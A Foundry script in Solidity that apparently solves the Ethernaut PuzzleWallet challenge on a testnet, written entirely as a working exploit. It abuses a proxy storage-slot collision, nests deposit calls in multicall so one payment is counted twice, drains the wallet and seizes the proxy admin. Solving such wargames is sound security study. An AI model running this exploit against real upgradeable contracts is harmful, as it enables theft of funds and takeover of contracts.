// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {IPuzzleWallet, IPuzzleWalletProxy} from "src/hack/interfaces/IPuzzleWallet.sol";

contract PuzzleWalletScript is Script {
    function run() external {
        address proxyAddress = vm.envAddress("PUZZLE_WALLET_ADDRESS");
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));
        IPuzzleWalletProxy proxy = IPuzzleWalletProxy(proxyAddress);

        vm.startBroadcast(attacker);

        // propose attacker as new admin
        // this will set owner variable of PuzzleWallet to attacker address
        proxy.proposeNewAdmin(attacker);
        console2.log("New pending admin set : ", proxy.pendingAdmin());

        // whitelist attacker address using proxy delegatecall
        (bool success, ) = proxyAddress.call(
            abi.encodeWithSelector(
                IPuzzleWallet.addToWhitelist.selector,
                attacker
            )
        );
        assert(success);
        console2.log("Set attacker to whitelist");

        // call multicall passing call data for deposit and multicall
        // inside inner multicall pass call data for execute
        bytes[] memory depositCall = new bytes[](1);
        depositCall[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSelector(IPuzzleWallet.deposit.selector);
        calls[1] = abi.encodeWithSelector(
            IPuzzleWallet.multicall.selector,
            depositCall
        );
        (success, ) = address(proxy).call{value: 0.001 ether}(
            abi.encodeWithSelector(IPuzzleWallet.multicall.selector, calls)
        );
        assert(success);
        console2.log("multicall executed");

        // call execute to drain the balance
        (success, ) = proxyAddress.call(
            abi.encodeWithSelector(
                IPuzzleWallet.execute.selector,
                attacker,
                0.002 ether,
                ""
            )
        );
        assert(success);
        console2.log("Funds drained from PuzzleWallet");

        // set maxBalance as your address
        (success, ) = proxyAddress.call(
            abi.encodeWithSelector(
                IPuzzleWallet.setMaxBalance.selector,
                uint160(attacker)
            )
        );
        assert(success);
        console2.log("Set maxBalance/admin to attacker address");

        assert(IPuzzleWallet(proxyAddress).owner() == attacker);

        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
